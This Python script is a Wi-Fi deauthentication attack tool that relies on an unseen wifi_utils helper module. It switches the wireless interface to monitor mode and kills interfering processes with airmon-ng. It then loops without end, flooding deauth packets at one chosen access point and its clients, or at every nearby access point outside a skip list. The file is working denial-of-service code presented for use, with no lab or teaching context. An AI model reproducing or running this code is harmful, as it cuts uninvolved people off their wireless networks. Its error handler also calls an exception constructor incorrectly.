import subprocess
from wifi_utils import *
import sys


def prepare_attack():
	monitor_mode()
	kill_processes()


def send_AP_deauth(AP):
	pkt = AP.build_AP_deauth_pkt()
	print("Sending deauth packet to %s" % (AP.BSSID))
	sendp(pkt, iface=network.interface_name, verbose=False)

def send_client_deauth(AP):
	for client in AP.clients:
		pkt = AP.build_client_deauth_pkt(client)
		sendp(pkt, iface=network.interface_name, verbose=False)


def deauth_AP(BSSID):
	interfaces = get_interfaces()
	iface = interfaces[0]  # we will use just one interface for now.
	iwlist_scan(iface)
	AP = network.get_AP(BSSID)
	set_channel(AP)
	prepare_attack()
	while 1:
		send_AP_deauth(AP)
		send_client_deauth(AP)


def deauth_all(skip):
	interfaces = get_interfaces()
	iface = interfaces[0]  # we will use just one interface for now.
	iwlist_scan(iface)
	prepare_attack()
	while 1:
		for AP in network.APs:
			if AP.BSSID in skip:
				continue
			set_channel(AP)
			send_AP_deauth(AP)
			send_client_deauth(AP)

def kill_processes():
    try:
        print("Killing processes that might interfer ...")
        subprocess.run(["airmon-ng", "check", "kill"],
                       check=True, capture_output=True)
    except subprocess.CalledProcessError:
        raise subprocess.CalledProcessError("Error killing processes.")